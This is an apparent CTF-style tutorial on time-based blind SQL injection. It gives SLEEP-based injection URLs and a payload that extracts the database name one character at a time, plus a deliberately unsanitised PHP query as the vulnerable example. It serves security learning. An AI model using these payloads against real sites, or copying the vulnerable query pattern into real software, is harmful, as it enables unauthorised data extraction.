

# SQL Injection: Time-Based Blind SQL Injection

## Introduction

Time-Based Blind SQL Injection is a type of SQL injection attack where the attacker uses SQL commands that cause the database to delay its response. By measuring the time it takes for the server to respond, the attacker can infer information about the database.

## Table of Contents

- [SQL Injection: Time-Based Blind SQL Injection](#sql-injection-time-based-blind-sql-injection)
  - [Introduction](#introduction)
  - [Table of Contents](#table-of-contents)
  - [How to identify](#how-to-identify)
  - [Code/tools/websites](#codetoolswebsites)
    - [Tools](#tools)
    - [Websites](#websites)
  - [Sample problem](#sample-problem)
    - [Problem Statement](#problem-statement)
    - [Solution](#solution)
  - [References](#references)
  - [Conclusion](#conclusion)

## How to identify

To identify Time-Based Blind SQL Injection vulnerabilities, look for inputs that cause delays in server responses. Indicators include:

1. **Behavior Testing:** Entering SQL syntax that includes delay functions (e.g., `SLEEP`) to see if the application response time changes.
2. **Consistent Delays:** Testing with various delay times to confirm the behavior. Example:
```SQL
http://example.com/item.php?id=1 AND IF(1=1, SLEEP(5), 0) -- (5-second delay)
http://example.com/item.php?id=1 AND IF(1=2, SLEEP(5), 0) -- (No delay)
```
3. **Code analysis:** When the source code is provided look for php code that doesn't sanitize the input.
Here is an example of a vulnerable PHP code snippet:
```php
<?php
$id = $_GET['id'];
$query = "SELECT * FROM items WHERE id = '$id'";
$result = mysqli_query($conn, $query);
?>
```
## Code/tools/websites

### Tools
- **SQLMap:** An automated tool for SQL injection and database takeover.
- **Burp Suite:** A web vulnerability scanner with tools for manual testing.
- **Havij:** An automated SQL injection tool.

### Websites
> https://www.hackthebox.com/: Great place to learn and practice problems
>
> https://picoctf.com/: They have many labs and past question which you can try with great write-ups available online.

## Sample problem

### Problem Statement
You are given access to a web application with an item details page. The URL for the item details page is:
```plaintext
http://example.com/item.php?id=1
```
Identify if the application is vulnerable to Time-Based Blind SQL Injection and extract the first character of the database name.

(`In reality you would need to do much more than that, but again out of scope for this topic.`)

### Solution
1. Test for SQL injection vulnerability using time-based testing:
   ```SQL
   http://example.com/item.php?id=1 AND IF(1=1, SLEEP(5), 0) -- (5-second delay)
   http://example.com/item.php?id=1 AND IF(1=2, SLEEP(5), 0) -- (No delay)
   ```

2. Use time-based payload to determine the first character of the database name:
   ```SQL
   http://example.com/item.php?id=1 AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0) -- (Check for 'a')
   ```

## References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security/sql-injection/blind/time-delays)
- [SQLMap Documentation](https://sqlmap.org/)

## Conclusion

Time-Based Blind SQL Injection exploits delays in server response times to infer information about the database. Identifying these vulnerabilities requires careful timing analysis and checking things one by one. 